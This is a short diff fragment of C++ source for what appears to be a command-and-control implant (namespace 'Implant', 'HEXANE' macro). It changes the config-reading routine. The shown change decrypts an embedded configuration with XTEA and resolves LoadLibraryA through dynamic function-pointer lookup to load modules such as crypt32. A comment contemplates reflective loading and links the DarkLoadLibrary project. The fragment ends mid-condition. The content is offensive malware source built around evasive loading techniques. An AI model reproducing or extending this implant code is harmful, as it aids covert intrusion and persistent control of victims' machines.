@@ -53,7 +53,6 @@ namespace Implant {
         FreeApi(Ctx);
     }
 
-
     VOID ReadConfig() {
         HEXANE
 
@@ -61,13 +60,16 @@ namespace Implant {
         Parser::CreateParser(&Parser, ConfigBytes, sizeof(ConfigBytes));
         x_memset(ConfigBytes, 0, sizeof(ConfigBytes));
 
-        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
+        BYTE pLE    = Parser::UnpackByte(&Parser);
+        BYTE pRoot  = Parser::UnpackByte(&Parser);
 
-        Ctx->LE     = Parser::UnpackByte(&Parser);
-        Ctx->Root   = Parser::UnpackByte(&Parser);
+        x_memcpy(&Ctx->LE, &pLE, 1);
+        x_memcpy(&Ctx->Root, &pRoot, 1);
 
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
+        Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length, Ctx->Config.Key, FALSE);
 
+        // todo: reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
                 !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
